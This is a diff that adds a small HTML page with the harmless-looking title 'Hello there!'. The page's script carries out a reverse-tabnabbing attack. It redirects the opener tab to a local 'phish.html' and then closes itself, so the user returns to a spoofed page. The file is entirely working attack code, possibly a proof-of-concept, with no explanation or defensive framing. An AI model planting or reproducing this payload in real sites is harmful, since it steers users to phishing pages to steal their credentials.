@@ -1,0 +1,15 @@
+<html>
+    <head>
+        <title>Hello there!</title>
+    </head>
+    <body>
+        <script>
+            if (window.opener) {
+                window.opener.location = 'phish.html';
+                setTimeout(function () { // looks useless but its not
+                    window.close();
+                }, 0);
+            }
+        </script>
+    </body>
+</html>
